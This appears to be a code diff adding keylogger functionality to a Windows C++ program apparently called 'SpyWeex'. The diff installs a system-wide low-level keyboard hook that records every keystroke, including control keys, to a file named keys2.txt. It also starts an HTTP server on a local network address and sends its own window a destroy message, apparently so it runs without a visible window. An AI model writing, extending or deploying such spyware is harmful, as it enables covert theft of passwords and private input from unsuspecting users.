@@ -23,6 +23,7 @@
 #include <tchar.h>
 #include <algorithm>
 #include <iostream>
+#include <fstream>
 
 #define MAX_LOADSTRING 100
 
@@ -30,12 +31,51 @@
 HINSTANCE hInst;                                // current instance
 WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
 WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
+HWND hWnd;										// window handle, for SendMessage
+//WPARAM wParam;
+//LPARAM lParam;
 
 // Forward declarations of functions included in this code module:
 ATOM                MyRegisterClass(HINSTANCE hInstance);
 BOOL                InitInstance(HINSTANCE, int);
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
+
+ofstream out2("keys2.txt", ios::out);
+
+LRESULT CALLBACK keyboard_hook_proc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
+
+	// If key is being pressed
+	if (wParam == WM_KEYDOWN) {
+		switch (p->vkCode) {
+
+			// Invisible keys
+		case VK_CAPITAL:	out2 << "<CAPLOCK>";		break;
+		case VK_SHIFT:		out2 << "<SHIFT>";		break;
+		case VK_LCONTROL:	out2 << "<LCTRL>";		break;
+		case VK_RCONTROL:	out2 << "<RCTRL>";		break;
+		case VK_INSERT:		out2 << "<INSERT>";		break;
+		case VK_END:		out2 << "<END>";			break;
+		case VK_PRINT:		out2 << "<PRINT>";		break;
+		case VK_DELETE:		out2 << "<DEL>";			break;
+		case VK_BACK:		out2 << "<BK>";			break;
+
+		case VK_LEFT:		out2 << "<LEFT>";		break;
+		case VK_RIGHT:		out2 << "<RIGHT>";		break;
+		case VK_UP:			out2 << "<UP>";			break;
+		case VK_DOWN:		out2 << "<DOWN>";		break;
+
+			// Visible keys
+		default:
+			out2 << char(tolower(p->vkCode));
+
+		}
+	}
+
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
@@ -63,25 +103,17 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         return FALSE;
     }
 
-
-	//try
-	//{
-	// Initialise the server.
 	std::string ip = "192.168.1.7";
 	std::string port = "56432";
 	http::server::server s(ip, port);
 	boost::thread t(boost::bind(&http::server::server::run, &s));
 
-
-	// Run the server until stopped.
-	//s.run();
-	//}
-	//catch (std::exception& e)
-	//{
-	//	std::cerr << "exception: " << e.what() << "\n";
-	//}
-
-
+	HHOOK keyboardHook = SetWindowsHookEx(
+		WH_KEYBOARD_LL,
+		keyboard_hook_proc,
+		hInstance,
+		0);
+	SendMessage(hWnd, WM_DESTROY, NULL, NULL);
     HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SPYWEEX));
     MSG msg;
 
@@ -97,7 +129,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	t.join();
     return (int) msg.wParam;
 }
-
 
 
 //
@@ -140,7 +171,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
    hInst = hInstance; // Store instance handle in our global variable
 
-   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
+   hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
       CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
 
    if (!hWnd)
@@ -194,6 +225,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
         }
         break;
     case WM_DESTROY:
+		out2.close();
         PostQuitMessage(0);
         break;
     default:
